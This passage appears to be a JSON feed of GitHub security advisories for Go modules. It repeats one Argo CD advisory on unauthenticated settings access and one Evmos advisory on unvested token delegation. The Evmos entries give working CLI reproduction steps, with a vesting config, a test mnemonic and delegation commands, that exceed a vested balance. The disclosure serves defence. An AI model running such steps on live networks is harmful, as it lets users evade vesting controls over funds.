{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h1 id=\"summary\">Summary</h1>\n<p>The CVE allows unauthorized access to the sensitive settings exposed by  /api/v1/settings endpoint without authentication. </p>\n<h1 id=\"details\">Details</h1>\n<h2 id=\"unauthenticated-access\"><strong>Unauthenticated Access:</strong></h2>\n<h3 id=\"endpoint-apiv1settings\">Endpoint: /api/v1/settings</h3>\n<p>Description: This endpoint is accessible without any form of authentication as expected. All sensitive settings are hidden except <code>passwordPattern</code>. </p>\n<p>Patches\nA patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.3\nv2.10.12\nv2.9.17</p>\n<h1 id=\"impact\">Impact</h1>\n<h2 id=\"unauthenticated-access-1\">Unauthenticated Access:</h2>\n<ul>\n<li>Type: Unauthorized Information Disclosure.</li>\n<li>Affected Parties: All users and administrators of the Argo CD instance.</li>\n<li>Potential Risks: Exposure of sensitive configuration data, including but not limited to deployment settings, security configurations, and internal network information.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37152\">https://nvd.nist.gov/vuln/detail/CVE-2024-37152</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b\">https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87p9-x75h-p4j2\">https://github.com/advisories/GHSA-87p9-x75h-p4j2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87p9-x75h-p4j2",
            "title": "[github.com/argoproj/argo-cd/v2/server] Unauthenticated Access to sensitive settings in Argo CD",
            "date_modified": "2024-06-06T21:27:45.000Z",
            "date_published": "2024-06-06T21:27:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87p9-x75h-p4j2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"summary\">Summary</h1>\n<p>The CVE allows unauthorized access to the sensitive settings exposed by  /api/v1/settings endpoint without authentication. </p>\n<h1 id=\"details\">Details</h1>\n<h2 id=\"unauthenticated-access\"><strong>Unauthenticated Access:</strong></h2>\n<h3 id=\"endpoint-apiv1settings\">Endpoint: /api/v1/settings</h3>\n<p>Description: This endpoint is accessible without any form of authentication as expected. All sensitive settings are hidden except <code>passwordPattern</code>. </p>\n<p>Patches\nA patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.3\nv2.10.12\nv2.9.17</p>\n<h1 id=\"impact\">Impact</h1>\n<h2 id=\"unauthenticated-access-1\">Unauthenticated Access:</h2>\n<ul>\n<li>Type: Unauthorized Information Disclosure.</li>\n<li>Affected Parties: All users and administrators of the Argo CD instance.</li>\n<li>Potential Risks: Exposure of sensitive configuration data, including but not limited to deployment settings, security configurations, and internal network information.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37152\">https://nvd.nist.gov/vuln/detail/CVE-2024-37152</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b\">https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87p9-x75h-p4j2\">https://github.com/advisories/GHSA-87p9-x75h-p4j2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87p9-x75h-p4j2",
            "title": "[github.com/argoproj/argo-cd/v2/server] Unauthenticated Access to sensitive settings in Argo CD",
            "date_modified": "2024-06-06T21:27:45.000Z",
            "date_published": "2024-06-06T21:27:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87p9-x75h-p4j2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"summary\">Summary</h1>\n<p>The CVE allows unauthorized access to the sensitive settings exposed by  /api/v1/settings endpoint without authentication. </p>\n<h1 id=\"details\">Details</h1>\n<h2 id=\"unauthenticated-access\"><strong>Unauthenticated Access:</strong></h2>\n<h3 id=\"endpoint-apiv1settings\">Endpoint: /api/v1/settings</h3>\n<p>Description: This endpoint is accessible without any form of authentication as expected. All sensitive settings are hidden except <code>passwordPattern</code>. </p>\n<p>Patches\nA patch for this vulnerability has been released in the following Argo CD versions:</p>\n<p>v2.11.3\nv2.10.12\nv2.9.17</p>\n<h1 id=\"impact\">Impact</h1>\n<h2 id=\"unauthenticated-access-1\">Unauthenticated Access:</h2>\n<ul>\n<li>Type: Unauthorized Information Disclosure.</li>\n<li>Affected Parties: All users and administrators of the Argo CD instance.</li>\n<li>Potential Risks: Exposure of sensitive configuration data, including but not limited to deployment settings, security configurations, and internal network information.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37152\">https://nvd.nist.gov/vuln/detail/CVE-2024-37152</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b\">https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-87p9-x75h-p4j2\">https://github.com/advisories/GHSA-87p9-x75h-p4j2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-87p9-x75h-p4j2",
            "title": "[github.com/argoproj/argo-cd/v2/server] Unauthenticated Access to sensitive settings in Argo CD",
            "date_modified": "2024-06-06T21:27:45.000Z",
            "date_published": "2024-06-06T21:27:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-87p9-x75h-p4j2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v6] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v7] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v8] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v9] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v10] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p><a href=\"https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1\">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href=\"https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv\">second advisory on the Cosmos SDK fork</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>\n<ol>\n<li>Download <code>vesting_setup.json</code> with the following contents:</li>\n</ol>\n<pre><code>{\n  \"start_time\": 1679602272,\n  \"periods\": [\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 10 \n    },\n    {\n      \"coins\": \"100000000000000000000aevmos\",\n      \"length_seconds\": 259200000\n    }\n  ]\n}\n</code></pre>\n<ol start=\"2\">\n<li>Run the following CLI commands to reproduce the issue locally:</li>\n</ol>\n<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes\n\n# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested\nevmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n\nevmosd keys add key1 --recover --home ~/.tmp-evmosd\n# Enter the following mnemonic\nskate tell option purity cattle poverty street act bone govern way various\n\nevmosd q staking validators --home ~/.tmp-evmosd | grep operator_address\n\n# Substitute the operator address from the previous query\n# Note that this delegates 70% of the user's available stake\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Re-run the same command\nevmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes\n\n# Note that the total delegations now exceed the user's vested balance\nevmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd\n</code></pre>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37154\">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7hrh-v6wp-53vw\">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw",
            "title": "[github.com/evmos/evmos/v11] Evmos allows unvested token delegations",
            "date_modified": "2024-06-06T21:32:01.000Z",
            "date_published": "2024-06-06T19:10:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7hrh-v6wp-53vw"
            },
            "tags": [
                "severity"
            ]
        },
        {
